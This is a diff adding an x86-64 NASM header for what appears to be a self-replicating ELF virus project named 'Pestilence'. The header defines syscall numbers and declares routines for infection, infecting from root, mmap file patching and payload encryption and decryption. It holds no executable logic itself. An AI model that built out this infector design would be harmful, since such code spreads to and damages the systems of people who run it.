@@ -1,0 +1,66 @@
+%ifndef PESTILENCE
+
+; Protection against double inclusion
+	%define PESTILENCE
+
+; Syscall numbers
+	%define PAGE_SIZE 8192
+	%define SYS_READ 0
+	%define SYS_WRITE 1
+	%define SYS_OPEN 2
+	%define SYS_CLOSE 3
+	%define SYS_LSEEK 8
+	%define SYS_MMAP 9
+	%define SYS_MUNMAP 11
+	%define SYS_FORK 57
+	%define SYS_EXECVE 59
+	%define SYS_EXIT 60
+	%define SYS_RENAME 82
+	%define SYS_UNLINK 87
+	%define SYS_SYMLINK 88
+	%define SYS_GETEUID 107
+	%define SYS_GETDENTS64 217
+
+; includes
+	%ifndef FAMINE_S
+		extern _start
+		extern _string
+		extern _o_entry
+		extern _read_dir
+		extern _ft_strlen
+		extern _verif
+		extern _verify_o_entry
+		extern _continue_normaly
+		extern _encrypted_part_start
+	%endif
+
+	%ifndef OPTIONS_S
+		extern _start_infect
+		extern _infect_from_root
+		extern _verify_starting_infect
+		extern _famine_start_options
+	    extern _fork_before_exec_normaly
+	%endif
+
+	%ifndef TREAT_FILE_S
+		extern _treat_file
+		extern _final_end
+	%endif
+
+	%ifndef UPDATE_MMAPED_FILE_S
+		extern _update_mmaped_file
+	%endif
+
+	%ifndef FORK_S
+		extern _thread_create
+	%endif
+
+	%ifndef DEPACKER_S
+		extern _decrypt
+		extern _end_decrypt
+	%endif
+
+	%ifndef ENCRYPT_S
+		extern _encrypt_zone
+	%endif
+%endif
